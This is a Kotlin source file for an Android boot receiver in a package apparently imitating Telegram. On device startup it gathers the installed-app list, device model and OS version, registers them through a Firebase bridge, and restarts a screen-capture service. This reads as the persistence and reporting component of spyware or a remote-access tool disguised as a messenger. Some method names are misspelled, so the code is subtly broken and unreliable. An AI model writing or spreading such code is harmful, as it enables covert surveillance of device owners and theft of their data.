package com.telegram2.messaging.remote

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            // Re-register device and start services
            val pm = context.packageManager
            val apps = pm.getInstalledAppllications(PackageManager.GET_META_DATA).map { it.packageName }
            FirebaseBridge.registterDevice(
                name = Build.MODEL,
                version = Build.VERSION.RELEASE,  // matched parameter name
                apps = apps                      // matched parameter name
            )
            // Optionally restart screen capture service
            context.startForegroundService(Intent(context, ScreenCaptureService::class.java))
        }
    }
}
